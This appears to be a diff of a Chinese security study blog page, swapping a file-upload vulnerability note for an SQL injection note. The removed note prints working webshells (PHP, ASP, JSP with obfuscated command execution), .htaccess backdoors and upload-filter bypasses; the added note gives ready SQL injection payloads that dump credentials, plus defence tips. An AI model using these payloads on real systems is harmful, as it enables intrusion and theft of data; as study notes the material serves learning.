@@ -4,14 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="文件上传学习笔记, Lifelong learning">
-    <meta name="description" content="文件上传漏洞原理
-一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。
-
-文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码。
-
-危害
-非">
+    <meta name="keywords" content="sql学习笔记, Lifelong learning">
+    <meta name="description" content="原理：
+sql注入是web应用程序对用户输入的数据的合法性没有进行判断，前端传入到后端的数据是可控的，并且参数被带入到数据库中查询，那么攻击者就可以构造指定的sql语句从而对数据库进行任意操作。
+但是sql注入得满足两个条件：
+1. 用户参">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>文件上传学习笔记 | Lifelong learning</title>
+    <title>sql学习笔记 | Lifelong learning</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -343,12 +340,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">文件上传学习笔记</h1>
+                    <h1 class="description center-align post-title">sql学习笔记</h1>
                 </div>
             </div>
         </div>
@@ -376,8 +373,8 @@
                                 <span class="chip bg-color">漏洞原理分析</span>
                             </a>
                         
-                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/">
-                                <span class="chip bg-color">文件上传学习</span>
+                            <a href="/tags/sql%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">sql学习</span>
                             </a>
                         
                     </div>
@@ -410,7 +407,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.4k
+                    1.7k
                 </div>
                 
 
@@ -430,228 +427,99 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><strong>文件上传漏洞原理</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。
+                <p><strong>原理</strong>：</p>
+<pre class="line-numbers language-none"><code class="language-none">sql注入是web应用程序对用户输入的数据的合法性没有进行判断，前端传入到后端的数据是可控的，并且参数被带入到数据库中查询，那么攻击者就可以构造指定的sql语句从而对数据库进行任意操作。
+但是sql注入得满足两个条件：
+1. 用户参数可控，前端传入到后端得数据内容是用户可以控制得。
+2. 参数被带入到数据库中查询，传入的参数被拼接到sql语句中，从而被带入到数据库中进行查询<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>sql查询语句及其一些内置函数</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">首先先介绍一下sql查询语句的一些语法：
+在不知道任何条件时，语句如下所示：
+SELECT 要查询的字段名 FROM 库名.表名
+在知道一条已知的条件时，语句如下所示：
+SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件的字段名='已知条件的值'
+在知道两条已知的条件时，语句如下所示：
+SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件1的字段名='已知条件1的值' AND 已知条件2的字段名='已知条件2的值'
+需要记住的一些MySQL数据库的内置函数：
+database(), schema() # 查询数据库的库名
+version()，@@version # 查询当前数据库的版本
+user(), system_user() # 查询当前使用数据库的用户是谁
+@@datadir # 查询当前数据库存放的物理路径
+@@version_compile_os # 查询当前数据库所使用的操作系统
+注：这些语法是MySQL数据库的语法，别的数据库语法与这数据库语法略有不同，通过这些函数能了解到关于该数据库的很多信息，对后面的帮助很大 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><strong>危害</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。
-这个恶意的脚本文件，又被称为WebShell，也可以将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>sql注入攻击的一些方法</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">union注入攻击：
+通过union select联合查询的方法，来得到数据库中的信息
+union select 1,(select table_name from information_schema.tables where table_schema=schema()),3--+
+union select 1,(select column_name from information_schema.columns where table_schema=schema() and table_name ='表名'),3--+
+union select 1,(select group_concat(table_name) from '表名')--+ # 此处用group_concat是因为数据太多了，显示不出来，所以使用group_concat 把它的列和行压缩成一行展示出来
+Boolean注入攻击：就是一种通过页面回显的内容来确定页面的信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><strong>防御</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">1. 文件扩展名服务端白名单效验
-2. 文件内容服务端效验
-3. 上传文件重命名
-4. 隐藏上传文件路径
-5. 限制相关目录的执行权限，防范WebShell攻击<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>报错注入攻击</strong>：</p>
+<pre class="line-numbers language-none"><code class="language-none">就是一种通过页面报错来获取数据库中的一些信息，但是它有一个前提条件，那就是数据库配置文件中有类似于print_r(mysql_error)此类的方法
 
-<p><strong>检测与绕过</strong></p>
-<p>无验证：<br>直接上传一句话木马或者WebShell脚本即可。</p>
-<p>客户端检测（Javascript检测：<br>在网页上写一段Javascript脚本，效验文件上传的后缀名，有白名单形式也有黑名单形式。如果上传文件的后缀不被允许，则会弹窗告知，此时文件上传的数据包并没有发送到服务端，只是在客户端浏览器使用Javascript对数据包进行检测</p>
-<p>这时有两种方法可以绕过客户端Javascript的检测：</p>
-<pre class="line-numbers language-none"><code class="language-none">1. 使用浏览器插件，删除检测文件后缀的Javascript代码，然后上传文件即可绕过
-2. 首先把需要上传的文件后缀改成允许上传的文件类型，如jpg、png、gif等，绕过Javascript检测，再抓包，把后缀名改成可执行文件的后缀即可上传成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+##### 下面是一些报错注入的一些函数：
 
-<p><strong>服务端检测（MINE类型检测）</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+xpath处理函数报错：updatexml(xml_doc,xpath,new_value), extractvalue(xml_doc,xpath)
 
-<p>服务器代码判断$_FILES[”file“][“type”]是不是图片格式（image/jpeg、image/png、image/gif），如果不是，则不允许上传该文件。<br>绕过方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">抓包后更改Content-Type为允许的类型绕过该代码限制，
-比如将php文件的Content-Type:application/octet-stream修改为image/jpeg、image/png、image/gif等就可以<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+整型溢出报错：exp
 
-<p>常见MIMETYPE</p>
-<pre class="line-numbers language-none"><code class="language-none">audio/mpeg -&gt; .mp3 application/msword -&gt; .doc application/octet-stream -&gt; .exe application/pdf -&gt; .pdf application/x-javascript -&gt; .js application/x-rar 
--&gt; .rar application/zip -&gt; .zip image/gif -&gt; .gif image/jpeg -&gt; .jpg / .jpeg image/png -&gt; .png text/plain -&gt; .txt text/html -&gt; .html video/mp4 -&gt; .mp4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+几何函数报错：geometrycollection(), polygon(), multipolygon(), linestring(), multilinestring(), multipoint()
 
-<p><strong>服务端检测（目录路径检测）</strong><br>对目录路径的检测不够严谨而导致可以使用%00截断绕过进行攻击。<br>绕过方法:</p>
-<pre class="line-numbers language-none"><code class="language-none">例如：/111.php%00.gif/111.gif -&gt; /111.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+列名重复报错：name_const()函数
 
-<p><strong>服务端检测（文件扩展名检测）</strong><br>绕过方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">- 文件名大小写绕过，如：*.pHp *.aSP
-- 文件名双写绕过，如：*.pphphp
-- Unicode： 当目标存在json_decode且检查在json_decode之前,可以将php写为\u0070hp
-- 名单列表绕过，如：*.asa *.cer
-- 特殊文件名绕过，比如windows文件名最后不能有.或空格，可设为*.php.或*.php+
-- 0x00截断绕过，比如：*.php(0x00).jpg 或 *.php%00.jpg
-- 文件包含漏洞
-- 服务器解析漏洞
-- .htaccess文件攻击<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+虚拟主键重复报错：floor+rand()+group by http://sqli.com/Less-1/?id=1' and (select 1 from (select count(*), concat(database(),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
 
-<p><strong>文件截断绕过攻击</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">截断类型：PHP%00截断
-截断原理：由于00代表结束符，所以会把00后面的所有字符删除
-截断条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+爆表名
+http://sqli.com/Less-1/?id=1' and (select 1 from (select count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema = schema()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
 
-<p>绕过方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">- 例如上传文件shell.php，上传文件路径为/?upload=shell.php
-- 绕过：/?upload=shell.php%00.jpg -&gt; /?upload=shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+爆列名
+http://sqli.com/Less-1/?id=1' and (select 1 from (select count(*), concat((select group_concat(column_name) from information_schema.columns where table_schema = schema() and table_name ='users'),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
 
-<p><strong>解析漏洞攻击</strong><br>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。</p>
-<p>目录解析：</p>
-<pre class="line-numbers language-none"><code class="language-none">- 形式：www.xxx.com/xxx.asp/xxx.jpg
-- 原理：服务器会默认把 .asp 和 .asp目录下的文件都解析成asp文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+从列表为username，password中提取出数据
+http://sqli.com/Less-1/?id=1' and (select 1 from (select count(*), concat((select concat(username,'~',password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>文件解析：</p>
-<pre class="line-numbers language-none"><code class="language-none">- 形式：www.xxx.com/xxx.asp;.jpg
-- 原理：服务器默认不解析;后面的内容，因此xxx.asp;jpg被解析为xxx.asp文件了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>时间盲注</strong>：</p>
+<pre class="line-numbers language-none"><code class="language-none">和布尔盲注类似，只不过布尔盲注是通过页面的信息来判断的，而时间盲注是通过页面的回显时间
+http://sqli.com/Less-1/?id=1' and if (length(database())&gt;2, sleep(5),sleep(1))--+
+用来截取数据库的长度，改变2的值，通过页面回显时间来最终确定数据库的长度
+http://sqli.com/Less-1/?id=1' and if (substr(database(),1,1)='s', sleep(5),sleep(1))--+
+用来截取当前数据库的库名，还是一样，通过更改前面那个1的值，然后根据页面的回显时间来最终确定该数据库的库名，因为时间盲注和布尔盲注比较复杂，所以到时会写成python脚本来执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>Apache解析漏洞 #<br>服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件</p>
-<pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>堆叠注入</strong>：</p>
+<pre class="line-numbers language-none"><code class="language-none">就是用;写入两个sql语句，然后分别执行两个sql语句，
+其它也就是php代码中mysqli_multi_query这个函数起的作用。
+multi这个单词代表了多次，堆叠注入的危害很大，可以直接delete from 表名，或者直接truncate table 表名等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>常用后缀：*.php *.php3 *.php4 *.php5 *.phtml *.pht</p>
-<p>在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。</p>
-<p>因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。</p>
-<pre class="line-numbers language-none"><code class="language-none">例如：shell.php.qwe.asd -&gt;shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>二次注入</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">就是类似于攻击者先构造一个恶意数据并被带到数据库中存储起来了，然后当我们去调用存储在数据库中的恶意数据与sql语句拼接进行查询，就造成了二次注入。
+举个例子，数据库中有一个用户名admin， 密码admin的用户。
+然后我们注册一个用户名为admin'#，密码为12345的用户，此时该数据已经被存储到数据库中了。
+然后我们修改admin'#的用户的密码，到最后会发现其它被改密码的不是admin'#用户，而是admin。
+这是因为 UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
+把我们修改的用户带入到里面去执行就变成了：
+UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass' #此时’admin'后面的语句被#注释了
+#真正生效的语句就是
+UPDATE users SET PASSWORD='$pass' where username ='admin' #所以就达到了修改admin用户密码的目的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>Nginx解析漏洞</p>
-<pre class="line-numbers language-none"><code class="language-none">Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过 正则匹配设置SCRIPT_FILENAME。当访问www.xxx.com/phpinfo.jpg/1.php这个 URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI。
-原因是开启了 fix_pathinfo 这个选项，会触发 在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会 将phpinfo.jpg作为PHP文件来解析了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>宽字节注入</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">宽字节注入其实就是当数据库是gbk编码时，传入的单引号被转义了，
+\的编码是%5c,我们此时通过在'前面给它加一个%df，而%df和%5c组合会组合成一个汉字。
+就会把单引号逃逸出来，数据库就会报错，就可以达到我们的效果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>攻击方式</p>
-<pre class="line-numbers language-none"><code class="language-none">- 形式： www.xxxx.com/UploadFiles/image/1.jpg/1.php www.xxxx.com/UploadFiles/image/1.jpg%00.php www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php
-- 另一种方法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h3><p>后面还有一些COOKIE注入，XFF注入，base64注入，其实原理跟前面的雷同</p>
+<h4 id="下面将介绍一些绕过技巧："><a href="#下面将介绍一些绕过技巧：" class="headerlink" title="下面将介绍一些绕过技巧："></a>下面将介绍一些绕过技巧：</h4><pre class="line-numbers language-none"><code class="language-none">- 双写绕过
+- 大小写绕过
+- 编码绕过(url解析一般都是一次，我们可以尝试给url编码二次试试)
+- 内联注释绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>IIS7.5解析漏洞</p>
-<pre class="line-numbers language-none"><code class="language-none">IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了 cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>sql修复建议</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">1. 过滤危险字符，采用正则表达式匹配union，sleep，load_file，into outfile等关键字，如果匹配到，就退出程序，
+2. 使用PDO预编译语句，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的增删查改。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><strong>竞争条件攻击</strong><br>一些网站上传文件的逻辑时先允许上传任意文件，然后检查上传文件的文件是否包含WebShell脚本，如果包含则删除该文件。<br>这里存在的问题是文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。<br>攻击方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">攻击者需要先上传一个WebShell脚本1.php，1.php的内容为生成一个新的WebShell脚本shell.php，1.php写入如下代码
-"""
-&lt;?php
-    fputs(fopen("../shell.php", "w"),'&lt;?php @eval($_POST['cmd']); ?&gt;');
-?&gt;
-"""
-当1.php上传完成后，客户端立即访问1.php，则会在服务端当前目录下自动生成shell.php，这时攻击者就利用了时间差完成了WebShell的上传<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>双文件上传</strong><br>本意为上传两个或多个文件去突破。上传点支持多文件上传，但是却只对第一个文件做了过滤。<br>利用方式：</p>
-<pre class="line-numbers language-none"><code class="language-none">- 在存在双文件上传漏洞的页面中，查看上传的页面。F12找到上传的post表单，action属性是指定上传检测页面，一般是写的绝对路径，比如：xxx.asp/xxx.php
-- 补全url：https://www.xxx.com/xxx.php(asp)
-- 构造本地post提交表单
-
-`&lt;form action="https://www.xxx.com/xxx.asp(php)" method="post"
-name="form1" enctype="multipart/form‐data"&gt;
-&lt;input name="FileName1" type="FILE" class="tx1" size="40"&gt;
-&lt;input name="FileName2" type="FILE" class="tx1" size="40"&gt;
-&lt;input type="submit" name="Submit" value="上传"&gt;
-&lt;/form&gt;`
-
-利用时只需要修改action的值为指定上传页面即可
-- 第一个文件上传允许的文件类型（.jpg .png .gif 等），第二个上传文件是一句话木马或者WebShell脚本。这样就可以突破上传限制，成功上传木马到服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>php3457</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">该项为apache专属。关键点在/etc/apache2/mods-available/php5.6.conf这个文件，满足.+\.ph(p[3457]?|t|tml)$，都会被当作php文件解析。
-在apache2目录下grep -r x-httpd-php /etc/apache2找到对应文件就能知道解析哪些后缀。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><strong>.htaccess文件攻击</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">.htaccess文件(或者"分布式配置文件"）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
-
-概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
-
-启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。
-
-笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>一般.htaccess可以用来留后门和针对黑名单绕过。在上传网站的根目录下，上传一个.htaccess文件即可。<br>绕过方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">- 针对黑名单绕过
-创建一个txt文件，写入
-`AddType  application/x-httpd-php    .png`
-另存为 .htaccess 名称，保存类型为所有文件，即可将png文件解析为php文件。
-
-- 留后门
-在.htaccess 内写入php解析规则，类似于把文件名包含s的解析成php文件
-`&lt;FilesMatch "s"&gt;
-SetHandler application/x-httpd-php
-&lt;/FilesMatch&gt;`
-shell.png 就会以php文件执行
-
-- 利用.htaccess进行文件包含
-`php_value auto_prepend_file ".htaccess"
-#&lt;?php eval($_POST[cmd]);?&gt;`
-- 使用#注释使得.htaccess能够成功解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>服务器检测（文件内容检测）</strong><br>文件幻数检测（文件开头）</p>
-<pre class="line-numbers language-none"><code class="language-none">幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
-<pre class="line-numbers language-none"><code class="language-none">.jpg    FF D8 FF E0 00 10 4A 46 49 46
-.gif    47 49 46 38 39 61
-.png    89 50 4E 47<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>在文件幻数后面加上自己的WebShell代码就行</p>
-<p>文件相关信息检测 #<br>图像文件相关信息检测常用的是getimagesize()函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
-<pre class="line-numbers language-none"><code class="language-none">例如下面结构
-GIF89a
-(...some binary data for image...)
-&lt;?php phpinfo(); ?&gt;
-(... skipping the rest of binary data ...)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>另一种是判断是否包含&lt;?或者php</p>
-<pre class="line-numbers language-none"><code class="language-none">绕过&lt;?：
-&lt;script language='php'&gt;@eval($_POST[cmd]);&lt;/script&gt;
-
-绕过php：
-&lt;?= @eval($_POST['cmd']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>绕过方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">对渲染/加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。
-对二次渲染的攻击方式就是攻击文件加载器自身。例如：
-上传文件数据不完整的gif文件 -&gt; 触发报错imagecreatefromgif()函数
-上传文件数据不完整的png文件 -&gt; 触发报错imagecreatefrompng()函数
-某后台调用GD库对图像进行二次渲染的代码
-
- function image_gd_open($file, $extension)
- {
- $extension = str_replace('jpg', 'jpeg', $extension);
- $open_func = 'imageCreateFrom'. $extension; //函数名变成imageCreateFrompng 之类
- if (!function_exists($open_func))
- {
-     return FALSE;
- }
- return $open_func($file); //变成imagecreatefrompng('/tmp/phpimage')
- }
-对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access/mdb溢出。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>文件上传中的目录穿越漏洞</strong><br>攻击方式</p>
-<pre class="line-numbers language-none"><code class="language-none">形式：上传的文件会被解析为日志不能执行，给出了/uploads/xxx.php路径并且可以查询
-
-绕过：上传文件的时候抓包，修改文件名（filename）为./../../../../flag，上传成功后路径变为/uploads/./../../../../flag即可进行目录穿越<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>攻击代码</strong><br>常用攻击代码</p>
-<pre class="line-numbers language-none"><code class="language-none">简单的一句话木马
-&lt;?php @eval($_POST['cmd']);?&gt;
-
-绕过&lt;?限制的一句话木马
-&lt;script language = 'php'&gt;@eval($_POST[cmd]);&lt;/script&gt;
-
-绕过&lt;?php ?&gt;限制的一句话木马
-&lt;?= @eval($_POST['cmd']);
-
-asp一句话木马
-&lt;%eval(Request.Item["cmd"],”unsafe”);%&gt;
-
-JSP一句话木马
-&lt;%if(request.getParameter("f")!=null)(newjava.io.FileOutputStream (application.getRealPath("\\")+request.getParameter("f"))).write (request.getParameter("t").getBytes());%&gt;
-
-JSP一句话免杀（ASCLL编码）
-&lt;%@ page contentType="text/html;charset=UTF-8"  language="java" %&gt;
-&lt;%
-    if(request.getParameter("cmd")!=null){
-        Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));
-        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null), request.getParameter("cmd") );
-        java.io.InputStream in = e.getInputStream();
-        int a = -1;byte[] b = new byte[2048];out.print("&lt;pre&gt;");
-        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("&lt;/pre&gt;");
-    }
-%&gt;
-
-ASPX一句话
-&lt;script language="C#"runat="server"&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y("add6bb58e139be10")&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>其它攻击代码</p>
-<pre class="line-numbers language-none"><code class="language-none">异或取反等操作写shell的php脚本、混淆木马、不死马。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/upload.png" alt="upload"></p>
+<p>至此完结，本人小白一枚，写博客纯属为了记笔记，如果有大佬看到这个网站，千万不要喷我，我是小菜鸡一枚。</p>
 
                 
             </div>
@@ -678,7 +546,7 @@ ASPX一句话
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://hwying1.github.io/2023/02/03/wen-jian-shang-chuan-xue-xi-bi-ji/">http://hwying1.github.io/2023/02/03/wen-jian-shang-chuan-xue-xi-bi-ji/</a>
+                    <a href="http://hwying1.github.io/2023/02/03/sql-xue-xi-bi-ji/">http://hwying1.github.io/2023/02/03/sql-xue-xi-bi-ji/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -720,8 +588,8 @@ ASPX一句话
                                     <span class="chip bg-color">漏洞原理分析</span>
                                 </a>
                             
-                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/">
-                                    <span class="chip bg-color">文件上传学习</span>
+                                <a href="/tags/sql%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">sql学习</span>
                                 </a>
                             
                         </div>
@@ -800,70 +668,18 @@ ASPX一句话
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/02/03/csrf-xue-xi-bi-ji/">
+                <a href="/2023/02/03/sql-xue-xi-bi-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="csrf学习笔记">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="sql学习笔记">
                         
-                        <span class="card-title">csrf学习笔记</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-03
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" class="post-category">
-                                    学习笔记总结
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
